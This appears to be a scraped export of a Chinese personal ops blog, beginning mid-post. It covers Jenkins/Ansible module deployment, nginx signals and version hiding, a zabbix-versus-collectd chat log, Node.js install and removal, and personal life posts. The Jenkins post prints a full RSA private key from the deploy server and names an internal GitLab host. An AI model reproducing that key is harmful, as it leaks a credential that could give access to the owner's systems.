it.split()[1].replaceAll('refs/heads/', '') &#125;.unique() 这是一段Groovy脚本，用来获取Git地址的分支，将Git地址改成自己的就行。 1.3接下来选择扩展功能。由于我们的项目模块较多，所有的服务全部重启会非常浪费时间，我们希望能对单独的模块进行部署，这时候需要添加一个可选择的参数Extensible Choice Parameter 扩展选择参数插件Extensible Choice Parameter灵活使用实现部署多应用模块服务同时发布.单模块服务单独打包快速发布. 实现效果： 发布选择应用模块，之前只能单个选择发布，效率太低，安装choice扩展性的插件，可以选择多个模块应用一起部署。非常方便下载插件：Extended Choice Parameter Plug-InExtensible Choice Parameter plugin 这里jenkins 第一步安装扩展插件： 安装好插件以后 进入创建项目配置参数： Value ：这里选择模块名字最好是git拉取下来的名称一样。这样下面打包可以选择对应模块名称一样。 这里构建使用shell 做一层if 判断 选择all 全部发布。和单独模块发布。 1.4Git配置初次使用Jenkins需要添加一个有访问Git权限的用户。我直接使用系统自带的ssh-key，也可以自己去生成。在gitlab上添加ssh-key公钥 这个是你发布机器的公钥。 1.源码管理选择Git，输入URL，并选择用户。 从Jenkins发布服务器上面查看公钥上传到gitlab. 2.在jenkins上点击添加私钥3.选择SSH…key，输入用户名，输入私钥，输入密码，添加完成。在Jenkins发布服务器上面查看私钥： 1234567891011121314151617181920212223242526[root@ansible_02 yaml]# cat /root/.ssh/id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAv5BSNmykQcvklQdb+3jV8d1I2tjq4tIiyVbQDhDBs6UFR4hj20EHg/3Tjvw+4mHtzWFYv1/rYeTg7xJ/bIf3XRIeRcrc/b2rvqo3wQBupRjHM6wbnd+Jgyv2v8Lk2c8yNzMoUIuYzcG5Dpv5mWyg1akbWcIH3tsGyTVXxxmAQ78L+J1Nzj3a9fImQcx5ocKlV/Y1v9B+Uv4gTBmSBR7akvNg7E+3JKTphbbUv3rFrG6zqvTWCtEA/h9X//zPWTiwTjJv87NJkHQLqoo1TPYZcNjDEfki+jfc9gJzJvZ/5D0A3fA/mO8ApW9VMsaLiiwQvGP2RoiTVwU2G1iNASBcWwIDAQABAoIBABh64fawhYEfBDQDP77wHy8MXz4QUFvyDJ38KRRTEd3aLcWJaXFgawx0CHASThrx9sizMvspz9OvwwrqKzx8V6EeKp4yoXEPpv3zlLJmUr1oYDR7PwA6y8Dmgl7ZEhO/haRGNlWssTdCFVsHlasElb0YIjWjNQxGoyRdW71GxfxiGdZXgWDT7yYGvdavO5tGzDPhh6/vf5lpU2F2nJbMyXzWgrrqXqIG3W+jqg2kVAfiMdNgeUOn6+SA/7uK8rNhxG/5dr7WKJE31uRSFJiVCATcHQBIRScDDd/nI8rGiVQOjHFt2oNV82DOIhNXhbzdWGROUcMiT04OoJgQJeNL7IkCgYEA8wrgamw1w5dBoynzV6tUPgSdHhAMoMhPrzJTaG8qMamnHzZgz1fl3jqI7qCNsj1n6Y1UbzhKILHcTIoUj7lj41mY4XVBHqDLXh9Socf9IPrSabZIfe2nwMLMhdhoaMPUWtHj9SUn/Y+ESLuFLtF6LjR1Eghu8xKRwULo1GscSyUCgYEAycbYj1/KaFAcwSl7teRiYEY+LRHB/AUa7lc+r+p2YMjGQ3CiaN9wKqu1E4jEvL0eZXDKaXJ6qcDJiHa2M+Bf8qcVoyXtKFtlTfSVPJDviZjl3EPmhXbuKzW3et2w5zWv8lAU2fWU+3ta3fVrFXz2zlY1j47Dv9zUlDeCF+lRMX8CgYEA1hkKwDU612XzSEy4NM6Uk111GvqAZVKP/4GRwDnNLZqJwhEhDwYbVLyzy6JbsFwvoaoCa0dm5Y5IxpQMsN9bZ9GGH7CWLEJ7a4gJmrYQYpECgYAIqe8WiOhp/jad3KghMUNAGwQEb2TC630yirB4YTrgAP7yWl2+3wkz69eElTTNXdl2RZeLW40EyPBeWaqNI686/g2hybkbKIF7DWtzBE4kvFnyUUAOrwKe/Fl6fxZfdyCs6N9cVH0nJy7JpQYKECmQxobaOSkSjerayl9dx1mI3d6fwqmAbbyiolLXbn3JySkxTaVBS8gjnQh6LO6JbpTspKlz3R2/CzUhDhEYn3vhU2trAGh6hY/bizI1oKNxwp/b9uAaLVmmHGNV/+V5glnDH+luQA==-----END RSA PRIVATE KEY----- 此处要注意，将默认的master分支改为我们之前定义好的分支变量. 1.5项目打包由于我们使用手动出发构建，触发器我们此处不需要配置。构建环境暂时也不需要配置，这里调用ansible去执行yml代码发布。项目打包优化了。 关键在于构建的步骤。我们可以使用Shell命令，进入项目目录，使用Maven命令进行打包。 这里主要是if 判断是 执行对应模块打包。这样节省了打包时间，如果不做对应发布模块发布，第一条如何model等于all 文件：全部执行 : mvn clean install -U -T 1C -Dmaven.test.skip=true 如果不等于这里指定对应模块打包： mvn clean install -pl $model -amd -U -T 1C -Dmaven.test.skip=true 123456echo $modelif [[ $model == all* ]]; thencd /srv/ &amp;&amp; rm dev-properties/ -rf &amp;&amp; git clone git@gitlab.ihaozhuo.com:dev-properties/dev-properties.git &amp;&amp; cd /root/.jenkins/workspace/yjk-dev_master/haozhuo/ &amp;&amp; mvn clean install -U -T 1C -Dmaven.test.skip=true -Dmaven.compile.fork=true -Pdev -Dautoconfig.userProperties=/srv/dev-properties/dev1.properties -Dautoconfig.charset=utf-8elsecd /srv/ &amp;&amp; rm dev-properties/ -rf &amp;&amp; git clone git@gitlab.ihaozhuo.com:dev-properties/dev-properties.git &amp;&amp; cd /root/.jenkins/workspace/yjk-dev_master/haozhuo/ &amp;&amp; mvn clean install -pl $model -amd -U -T 1C -Dmaven.test.skip=true -Dmaven.compile.fork=true -Pdev -Dautoconfig.userProperties=/srv/dev-properties/dev1.properties -Dautoconfig.charset=utf-8fi 所有的脚本和变量的参数列表统一。 这里说下发布模块 结合ansible-Playbook基本语法写控制发布服务器，然后在jenkins上面写ansible 发布脚本&amp;命令。model.sh 脚本： 12345678910111213#!/bin/sh IFS=',' arr=$1 for split in $arr do echo $split /usr/bin/ansible-playbook /srv/yaml/$split.yml if [ $split = 'all' ] then echo \"model:all\" break fi done 这里举个例子我上面发布yml模块代码。 这个脚本做了五件事：1) 首先指定编码为UTF-8（否则启动项目后会乱码！这是个坑!）2) 拷贝文件到指定机器的目录下，拷贝命令的dest不能使用变量！否则拷贝不会成功！（第二个坑）3) 重启远程服务，我们试过直接重启tomcat服务，虽然服务重启会成功，但是最后会报一个错误，导致项目编码无法指定为UTF-8，所以我们还是选择使用Shell脚本去重启服务（第三个坑）。4） 进行创建目录备份。5） 查看进程后台启动。 Ansible脚本编写完之后，可以现在自己本机上执行一下。目标机器上必须安装libselinux-python，不然无法执行成功（小坑）。 在jenkins中我们做如下配置：在构建打包命令后面我们增加一个Shell命令，用来执行Ansible的脚本。我们脚本名称使用变量名称，这样我们选择模块就能执行对应的脚本。 1.6发送邮件配置好构建失败后发送邮件到指定的邮箱，多个邮箱用逗号隔开。 至此项目配置结束。 六.运行效果，打包效果。指定模块去打包，终端上查看发布日志 这里变量生效效果： 七. Jenkins延伸学习效果图： Blue Ocean 是Jenkins 非常不错一个提升。 这里可以查看下我在我github上面扩展更新jenkins新功能Blue Ocean实现先进的可视化精确定位问题 现在我们Git使用的是 GitLab，同时为了安全我们做了一层LDAP代理，效果相当于“将军令”，操作机、Git和Jenkins用 OpenLDAP 做统一认证，后续用到的Redmine、Grafana、Zabbix 等都接入了OpenLDAP认证，每个人都有个动态口令，每次验证都需要用到。","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"http://blog.yangcvo.me/tags/Jenkins/"},{"name":"Manven","slug":"Manven","permalink":"http://blog.yangcvo.me/tags/Manven/"},{"name":"jdk","slug":"jdk","permalink":"http://blog.yangcvo.me/tags/jdk/"}]},{"title":"考驾照的艰辛历程","slug":"个人生活记录/考驾照的艰辛历程","date":"2016-09-11T12:32:17.000Z","updated":"2017-03-14T05:55:43.000Z","comments":true,"path":"2016/09/11/个人生活记录/考驾照的艰辛历程/","link":"","permalink":"http://blog.yangcvo.me/2016/09/11/个人生活记录/考驾照的艰辛历程/","excerpt":"","text":"🍓 今天是2016年9月11号，在过几天就是中秋节了，刚刚大学毕业出来一年了，在加上实习工作一年多了，算起来工作两年多了，在读大学和参加一些技术培训班就没有时间去考一本属于自己的驾照，一直拖到现在的确是挺忙的。 ……. 经验之谈 9月10号我是在网上预订了考试报名的–驾校服务平台 这边点击报名他们会主动联系你，会安排到他们公司集合，会跟你讲一系列的考驾照的流程非常不错，而且有司机专门接送。 下面是我到他们公司的时候，给我看的驾照手册： 这里我也拍照下来啦。的确非常方便，还有后面让我下载1217的APP可以预约考试。 他们驾校合作平台我的理解：他们这种合作平台就是跟杭州大大小小的驾校合作，可是现在很多驾校师傅服务不周到，他们都是自己招聘的专业师傅和新车，一对一培训非常有效，而且服务好。 这点是也是我们的方便的好处在杭州网上报名我的价格是：3999 先是在这边公司签合同报名好需要交钱的 报名缴费细节：123456789101112第一笔：1000+30 ## 1000元 是给车管所的费用.也就是你考科目一和科目四考试场地和工本费📚书本费用还有光盘💿费用就是查看学习资料的。## 30元 是体检的费用。在杭州市要体检的非常正规，有视力科，听力科，四肢运动🏃科，还有身高体重等等。第二笔：2969###这个是给公司平台的也是他们给教练发工资的说白了。其实跟驾校合作的，这样大家应该很明白了把。 杭州报名考试需要注意的：1234567* 考试前要多问问杭州本地的考完的老师傅，考试要带身份证和暂住证，听说现在G20峰会过后就不用暂住证了，不过还要等国家政策出来才能考驾照。* 科目一选择上课地点最好选择自己比较近的。不懂的可以问平台的客服。这点非常棒👍* 学习科目一：可以去网上看看模拟题，很简单的。第一次做就90分了。* 去报名的时候还会给你发票记得留着，因为考试需要看的，别到时候很麻烦补办。 下面分享下报名成功资料这么多：","raw":null,"content":null,"categories":[{"name":"生活","slug":"生活","permalink":"http://blog.yangcvo.me/categories/生活/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"}]},{"title":"厨艺依然好👍","slug":"个人生活记录/厨艺依然好👍","date":"2016-09-02T13:18:06.000Z","updated":"2017-03-14T05:55:50.000Z","comments":true,"path":"2016/09/02/个人生活记录/厨艺依然好👍/","link":"","permalink":"http://blog.yangcvo.me/2016/09/02/个人生活记录/厨艺依然好👍/","excerpt":"","text":"一个男的能做的出一手好的美食是多么棒👍的一件事。这还要感谢我有一个特别的棒的父亲。 记得小时候12岁我就开始学会做饭，学会第一道菜南瓜饭🎃。 这个的确也是我对做美食也很感兴趣，什么红烧鸡翅，红烧排骨，红烧肉，🐟鱼类最拿手了。 江南家常菜都比较会点，这也是我一个优点吧。 自己出来工作，在外面工作来往同事朋友来家里玩，自己会下厨可以露一手。 最近工作不是特别忙就继续拿起程式菜谱小弄了几道小菜： 是不是特别棒👍 😁","raw":null,"content":null,"categories":[{"name":"生活","slug":"生活","permalink":"http://blog.yangcvo.me/categories/生活/"}],"tags":[{"name":"Personal life record","slug":"Personal-life-record","permalink":"http://blog.yangcvo.me/tags/Personal-life-record/"}]},{"title":"Nginx 的启动、停止、平滑重启、信号控制和平滑升级","slug":"Web服务技术/Nginx/Nginx 的启动、停止、平滑重启、信号控制和平滑升级 ","date":"2016-08-23T09:25:23.000Z","updated":"2017-04-16T07:38:14.000Z","comments":true,"path":"2016/08/23/Web服务技术/Nginx/Nginx 的启动、停止、平滑重启、信号控制和平滑升级 /","link":"","permalink":"http://blog.yangcvo.me/2016/08/23/Web服务技术/Nginx/Nginx 的启动、停止、平滑重启、信号控制和平滑升级 /","excerpt":"","text":"Nginx 的启动、停止、平滑重启、信号控制和平滑升级Nginx的启动假设 nginx 安装在/usr/local/nginx 目录中，那么启动 nginx 的命令就是： 1[root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf 参数&quot;-c&quot; 指定了配置文件的路径，如果不加&quot;-c&quot;参数，Nginx 会默认加载其安装目录的 conf 子目录中的 nginx.conf 文件。 Nginx的停止nginx 的停止方法有很多，一般通过发送系统信号给 nginx 的主进程的方式来停止 nginx。 1、从容停止Nginx 123[root@Nginx_01 ~]# kill -QUIT 【Nginx主进程号】或者[root@Nginx_01 ~]# kill -QUIT `/usr/local/nginx/logs/nginx.pid` 字符是数字键盘 1 字符左边的那个字符，不需要 Shift，直接按 ` 字符即可。如果在 nginx.conf 配置文件中指定了 pid 文件存放的路径，该文件中存放的就是 nginx 当前的主进程号。默认是放在 nginx 安装目录的 logs 目录下。 2、快速停止Nginx 12345678[root@Nginx_01 ~]# kill -TERM 【Nginx主进程号】或者[root@Nginx_01 ~]# kill -INT 【Nginx主进程号】 ``` &gt;3、强制停止所有 nginx 进程 ```bash[root@Nginx_01 ~]# pkill -9 nginx Nginx的平滑启动如果改变了 nginx 的配置文件，想重启 nginx，同样可以发送系统信号给 nginx 主进程的方式来进行。不过，重启之前，要确认 nginx 配置文件的语法是否正确的。否则 nginx 将不会加载新的配置文件。可以通过以下命令来判断配置文件是否正确： 123456789# -t 参数将检查配置文件的语法是否正确，默认会检查 /usr/local/nginx/conf/nginx.conf 文件。 [root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -t # 如果要对指定的配置文件进行语法检查，可以继续添加 -c 参数 [root@Nginx_01 ~]# /usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf 这个时候，就可以平滑重启 nginx 了。 [root@Nginx_01 ~]# kill -HUP 【Nginx主进程号】 当 nginx 接收到 HUP 信号时，它会尝试先解析配置文件，如果成功，就应用新的配置文件(例如，重新打开日志文件或监听的套接字)。之后，nginx 运行新的工作进程并从容关闭旧的工作进程。通知工作进程关闭监听套接字，但是继续为当前连接的客户提供服务。所有的客户端的服务完成后，旧的工作进程被关闭。如果新的配置文件应用失败，nginx 将继续使用旧的配置文件进行工作。 Nginx 的平滑升级当需要将正在运行中的 nginx 升级、添加/删除服务器模块时，可以在不中断服务的情况下，使用新版本、重编译的 nginx 可执行程序替换旧版本的课执行程序。步骤如下： 12345678910111213141516171819(1) 使用新的可执行程序替换旧的可执行程序，对于编译安装的 nginx，可以将新版本编译安装到旧版本的 nginx 安装路径中。替换之前，最好备份一下旧的可执行文件。 (2) 发送以下指令： [root@Nginx_01 ~]# kill -USR2 【旧颁布的Nginx主进程号】 (3) 旧版本 nginx 的主进程将重命名它的 pid 文件为 .oldbin(例如：/usr/local/nginx/logs/nginx.pid.oldbin)，然后执行新版本的 nginx 可执行程序，依次启动新的主进程和新的工作进程。 (4) 此时，新、旧版本的 nginx 实例会同时运行，共同处理输入的请求。要逐步停止旧版本的 nginx 实例，你必须发送 WINCH 信号给旧的主进程，然后，它的工作进程就将开始从容关闭：[root@Nginx_01 ~]# kill -WINCH 【旧版本的Nginx主进程号】 (5) 一段时间后，旧的工作进程(worker process)处理了所有已连接的请求后退出，仅由新的工作进程来处理输入的请求了。 (6) 这时候，我们可以决定是使用新版本，还是恢复到旧版本： [root@Nginx_01 ~]# kill -HUP 【旧的主进程号】：nginx 将在不重载配置文件的情况下启动它的工作进程 [root@Nginx_01 ~]# kill -QUIT 【新的主进程号】：从容关闭其工作进程(worker process) [root@Nginx_01 ~]# kill -TERM 【新的主进程号】：强制退出 [root@Nginx_01 ~]# kill 【新的主进程号或旧的主进程号】：如果因为某些原因新的工作进程不能退出，则向其发送 kill 信号 新的主进程退出后，旧的主进程会移除 .oldbin 后缀，恢复为它 的 .pid 文件，这样，一切就恢复到升级之前了。如果尝试升级成功，而你也希望保留新的服务器时，可发送 QUIT 信号给旧的主进程，使其退出而只留下新的服务器运行。","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"企业级Nginx Web服务优化实战","slug":"Web服务技术/Nginx/企业级Nginx Web服务优化实战","date":"2016-08-23T09:25:23.000Z","updated":"2017-04-10T01:53:10.000Z","comments":true,"path":"2016/08/23/Web服务技术/Nginx/企业级Nginx Web服务优化实战/","link":"","permalink":"http://blog.yangcvo.me/2016/08/23/Web服务技术/Nginx/企业级Nginx Web服务优化实战/","excerpt":"","text":"企业级Nginx Web服务优化实战前言: 在运维工作已经3个年，运维岗位：对web服务是必须要会的，这次我对Nginx Web服务做一次优化总结，上次记得写博客是对Nginx配置详解和服务的高可用。希望写的对你看到我博客的人有所帮助。 1.1 Nginx 基本安全优化1.1.2 调整参数隐藏Nginx软件版本号信息 这里说隐藏版本号重要性软件出现漏洞跟版本特别有关系，我们尽可能隐藏或消除web服务队访问用户显示各类敏感信息，这样恶意要攻击你的用户就很难猜到他攻击的服务所用的是否有特定的漏洞的软件，或者是否有对应漏洞的某一特定版本，从而加强了Web服务的安全性。 例子： 12345678910[root@nginx ~]# curl -I 127.0.0.7 HTTP/1.1 200 OKServer: nginx/1.9.7 #&lt;--这里清晰地暴露了web版本号（1.9.7）以及软件名称（Nginx）Date: Sat, 08 Apr 2017 08:15:59 GMTContent-Type: text/htmlContent-Length: 612Last-Modified: Thu, 19 Nov 2015 05:50:20 GMTConnection: keep-aliveETag: \"564d631c-264\"Accept-Ranges: bytes 如何隐藏可以通过配置文件加参数来实现： 在Nginx配置文件Nginx.conf 中的server标签🏷内加入“server_tokens off”参数，具体查看如下： 12345678910server &#123; listen 80; server_name localhost; server_tokens off; location / &#123; root html; index index.html index.htm; limit_req zone=one; &#125; 配置完成后保存，重新加载配置文件，再次curl查看： [root@nginx ~]# curl -I 127.0.0.7 HTTP/1.1 200 OK Server: nginx Date: Sat, 08 Apr 2017 08:20:31 GMT Content-Type: text/html Content-Length: 612 Last-Modified: Thu, 19 Nov 2015 05:50:20 GMT Connection: keep-alive ETag: \"564d631c-264\" Accept-Ranges: bytes","raw":null,"content":null,"categories":[{"name":"nginx","slug":"nginx","permalink":"http://blog.yangcvo.me/categories/nginx/"}],"tags":[{"name":"Web Service","slug":"Web-Service","permalink":"http://blog.yangcvo.me/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","permalink":"http://blog.yangcvo.me/tags/Nginx/"}]},{"title":"直播分享的主题是云监控----zabbix&collectd 互相讨论","slug":"性能监控/Zabbix/直播分享的主题是云监控----zabbix&collectd 互相讨论","date":"2016-08-21T10:42:58.000Z","updated":"2017-03-14T06:01:29.000Z","comments":true,"path":"2016/08/21/性能监控/Zabbix/直播分享的主题是云监控----zabbix&collectd 互相讨论/","link":"","permalink":"http://blog.yangcvo.me/2016/08/21/性能监控/Zabbix/直播分享的主题是云监控----zabbix&collectd 互相讨论/","excerpt":"","text":"直播分享的主题是云监控—-zabbix&amp;collectd 互相讨论前几天参加KVM开展的直播秀，肖总请来了各位运维大咖给我们展示他们云监控。这里我整理下崔广章大师的聊天记录各位可以一起聆听下。 12345678910111213141516171819202122232425 崔广章 19:58我之前一直在做私有云，我们整个云平台的监控系统系统用的就是zabbix 崔广章 19:59基本没什么变化，做的比较多的就是国际化，大家都懂的 崔广章 20:00我先借度娘给搭建扫个盲 崔广章 20:00zabbix（音同 zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 崔广章 20:01zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 崔广章 20:02zabbix由2部分构成，zabbix server与可选组件zabbix agent。 崔广章 20:02zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。 崔广章 20:02扫盲就到此为止吧 崔广章 20:03按度娘的，接下来就是安装啦，我就在这耽误大家的人间啦 崔广章 20:04zabbix监控主要分四块，zabbix-agent,SNMP,IPMI,和JMX 崔广章 20:05因为我们主要是是做Iaas和Pass的，所以我们只用了前三种功能 崔广章 20:06前三种功能又分为两种方案，就是负载大时的一种方案和负载小时的方案 崔广章 20:07 12345 崔广章 20:07这是小负载时的方案 崔广章 20:08接下来是大负载时的方案 崔广章 20:08 12崔广章 20:11这里还有一个zabbix的整体架构广章 20:11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136 崔广章 20:12我从14年才开始将zabbix进行分布式部署 崔广章 20:14在云环境下，zabbix有个缺点就是，对虚拟机的监控达我们感觉不理想 崔广章 20:15因为zabbix对与虚拟与物理机进行监控采取的是同样的方法，就是向系统中注入代理zabbix-agent 崔广章 20:15对诸如代理我有两点担心 崔广章 20:17一、因为zabbix-agent它本身也占用了资源，对于自己占用的资源它能不能准确监控，这我还不能确定，如果它不能对自己占用的资源进行准确监控，那就等于污染了虚拟机 崔广章 20:19二，zabbix-agent是打包在云主机的镜像中的一个cron任务，说白他就是云主机的一个普通进程，如果用户把它给kill了，是不是就监控不到啦？ 崔广章 20:21所以我就找能运行在底层又能对虚拟机进行准确检测的工具 崔广章 20:21那就是接下来要说的collectd喽 崔广章 20:21老规矩，咱们还接着扫盲 崔广章 20:21collectd是一个守护(daemon)进程，用来收集系统性能和提供各种存储方式来存储不同值的机制。比如以RRD 文件形式。 崔广章 20:29collectd确实能够运行在底层，并能采集KVM虚拟机的各项数据，但他的展示使用CGP跟zabbix比太差 崔广章 20:31我所以我就试着将两者进行优势互补 崔广章 20:32我是将collectd存储在*.rrd中的相关数据取出来，然后存储到zabbix的数据库当中，让zabbix进行展示 崔广章 20:33其实只是将collectd采集的虚拟机的内存的数据进行转存和展示 崔广章 20:36整个过程包括，分析zabbix的数据库表之间的关系，研究怎么从collectd的*.rrd文件中取数据怎么将取出的数据向数据库里保存，这是一项很大的工程 崔广章 20:36今天就分享到这吧好吧？ 侯燚@贵州高新翼云 20:37谢谢 崔广章 20:37 袁进坤|南京|云应用+大数据+云计算 20:37 薛群 20:37其实你说的第一个问题，不是问题 北极熊 20:37大家开始提问吧 薛群 20:38只要是监控，都需要消耗少量资源 崔广章 20:38这个问题我也请教过肖哥@薛群 刘海宾 20:38通过libvirt也能获取虚拟机的内存 崔广章 20:38嗯嗯 薛群 20:38不属于污染虚拟机哦 崔广章 20:38嗯嗯 薛群 20:39腾讯云上的虚拟机十几个agent 崔广章 20:39collectd就是调用了libvirt 崔广章 20:39@薛 崔广章 20:40错啦 袁进坤|南京|云应用+大数据+云计算 20:40在选择监控工具的时候，是否考虑过其他类似的工具，例如nagios，做出选择的主要考虑是什么？ 薛群 20:40第二种方式，消耗资源多不？ 刘海宾 20:40那collected就干这一件事吗 崔广章 20:40 刘海宾 20:40其实虚拟机监控可以用qga 刘海宾 20:41走channel 薛群 20:41nagios功能没有ZBX强，性能也不及 崔广章 20:41collectd目前我只让它干了怎么一件事 刘海宾 20:42那自己写个脚本更简单吧 呵呵 只是个人观点 崔广章 20:42我也试着写了一套脚本 刘海宾 20:43@薛群 私有云跑agent还好 公有云 用户很反感 薛群 20:43@袁进坤@南京，云计算 其实监控主要考虑：方便，扩展性好(规模和二次开发)，功能全， 崔广章 20:43但数据误差太大 崔广章 20:44就是考虑到这一点@刘海宾@新网 刘海宾 20:45虚拟机加上ballon 薛群 20:46嗯，是的。腾讯云上这么多agent，是不爽 崔广章 20:46ballon跟内存监控关系不大@刘海宾@新网 于江磊@奇点时代 20:47zabbix再多个配置不同的vm时，请问模板是分别定制的么 崔广章 20:48对的 于江磊@奇点时代 20:48监控多个 刘海宾 20:49libguestfs也能干这事 袁进坤|南京|云应用+大数据+云计算 20:50@薛群 @崔广章 谢谢 刘海宾 20:50青云的监控走的channel在 init里边起了个进程 不容易杀死 还不错 刘海宾 20:51@崔广章 谢谢分享 崔广章 20:51@袁进坤@南京，云计算 崔广章 20:51 袁进坤|南京|云应用+大数据+云计算 20:52@崔广章 主要监控了哪些指标？如果在openstack架构，ceilometer和zabbix的的关系怎么看？ 刘浩 20:52我求问个问题：把zabbix agent用supervise起。是不是就不用担心被杀死的问题了。 于江磊@奇点时代 20:53我在用zabbix时,遇到一个问题,监控主机网卡的时候,zabbix默认采用了auto_discovery的策略,但是我宿主机上跑了很多个容器,容器的网络运行模式为桥接,此时zabbix就会自动去检测那些veth的设备,请问我该如何配置呢? 达到让zabbix只监控em0 或者eth0的网卡设备呢 崔广章 20:54ceilometer其实是openstack自带的功能，但是功能很菜@袁进坤@南京，云计算 崔广章 20:54@刘浩@360 其实我就是怎想的 年福瑞@小牛资本 20:57@于江磊@奇点时代 自己写脚本，取物理别名 崔广章 20:58我也遇到这样的问题@于江磊@奇点时代 刘浩 20:59@崔广章 那是不是可以不用collected了 崔广章 21:00理论上是可以，但数据转存的时候，工作量很大@刘浩@360 崔广章 21:01难点主要在zabbix端，关系错综复杂 薛群 21:01@于江磊@奇点时代 用正则表达式过滤 薛群 21:03公有云起agent确实是个问题 崔广章 21:03这是公有云的痛点 就整理这些，想说现在监控也越来越完善了，可以做到邮件告警，微信告警，钉钉告警短信电话告警。 万能的监控zabbix只要有key值都可以做到任何监控。 也还有些公司对监控更加要求性高可以针对性技术开发一套监控大屏，记得在之前公司运维CDN就是整个技术团队研发一套监控大盘的，主要监控流量的状态每个节点的流量带宽。 有兴趣一起研究监控的可以加我QQ:1165958741 或者加入群一起讨论：459096184","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"Centos7.1+Mac环境安装Node.Js以及彻底删除卸载node.js教程","slug":"Node.js/Centos7.1+Mac环境安装Node.Js以及彻底删除卸载node.js教程","date":"2016-08-16T07:12:31.000Z","updated":"2017-03-29T10:17:14.000Z","comments":true,"path":"2016/08/16/Node.js/Centos7.1+Mac环境安装Node.Js以及彻底删除卸载node.js教程/","link":"","permalink":"http://blog.yangcvo.me/2016/08/16/Node.js/Centos7.1+Mac环境安装Node.Js以及彻底删除卸载node.js教程/","excerpt":"","text":"Linux Centos7安装Node.js+npm:安装相关依赖 12345$ yum -y install gcc make gcc-c++ openssl-devel wget$ wget http://nodejs.org/dist/v7.8.0/node-v7.8.0-linux-x64.tar.gz$ tar zxf node-v7.8.0-linux-x64.tar.gz &amp;&amp; cd node-v7.8.0-linux-x64.tar.gz$ cp bin/* /usr/bin # 拷贝执行目录，相当于去设置一个环境变量到用户的bin目录$ ln -s /srv/node-v7.8.0-linux-x64/bin/npm /usr/bin/npm 检查一下版本号看是否安装成功 1234[root@node srv]# node -vv7.8.0[root@node bin]# npm -v4.2.0 卸载node.js用自带的包管理先删除一次 1yum remove nodejs npm -y 依次类推，看你的操作系统用什么包管理，比如推出如果你是用brew 安装的 node 需要用 brew先删除一次 手动删除残留进入 /usr/local/lib删除所有 node 和 node_modules文件夹 进入 /usr/local/include 删除所有 node 和 node_modules 文件夹 检查 ~ 文件夹里面的”local” “lib” “include” 文件夹，然后删除里面的所有 “node” 和 “node_modules” 文件夹 可以使用以下命令查找 12find ~/ -name node find ~/ -name node_modules 进入 /usr/local/bin 删除 node 的可执行文件 以下步骤可选: 删除: /usr/local/bin/npm 删除: /usr/local/share/man/man1/node.1删除: /usr/local/lib/dtrace/node.d删除: rm -rf /home/[homedir]/.npm删除:rm -rf /home/root/.npm Mac OS安装: 安装报错304： 安装Node.Js 报错 340 解决方法Fixing npm On Mac OS X for Homebrew UsersIf you just want to fix the issue quickly, scroll down to the “solution” section below.Explanation of the issueIf you’re a Homebrew user and you installed node via Homebrew,there is a major philosophical issue with the way Homebrew and NPM work together.If you install node with Homebrew and then try to do npm update npm -g, you may see an error like this: 12345678910111213141516171819202122232425$ npm update npm -g npm http GET https://registry.npmjs.org/npmnpm http 304 https://registry.npmjs.org/npm npm http GET https://registry.npmjs.org/npm/1.4.4 npm http 304 https://registry.npmjs.org/npm/1.4.4 npm ERR! error rolling back Error: Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm npm ERR! error rolling back at clobberFail (/usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:57:12)npm ERR! error rolling back at next (/usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:43:14)npm ERR! error rolling back at /usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:52:12npm ERR! error rolling back at Object.oncomplete (fs.js:107:15)npm ERR! error rolling back npm@1.4.4 &#123; [Error: Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm] code: 'EEXIST', path: '/usr/local/bin/npm' &#125; npm ERR! Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm File exists: /usr/local/bin/npm Move it away, and try again.npm ERR! System Darwin 13.1.0 npm ERR! command \"/usr/local/Cellar/node/0.10.26/bin/node\" \"/usr/local/bin/npm\" \"update\" \"npm\" \"-g\" npm ERR! cwd /Users/dan/Google Drive/Projects/dotfiles npm ERR! node -v v0.10.26 npm ERR! npm -v 1.4.3 npm ERR! path /usr/local/bin/npm npm ERR! code EEXIST npm ERR! npm ERR! Additional logging details can be found in: npm ERR! /Users/dan/Google Drive/Projects/dotfiles/npm-debug.log npm ERR! not ok code 0 There’s an NPM bug for this exact problem. The bug has been “fixed”by Homebrew installing npm in a way that allows it to manage itself once the install is complete. However,this is error-prone and still seems to cause problems for some people.The root of the the issue is really that npm is its own package manager 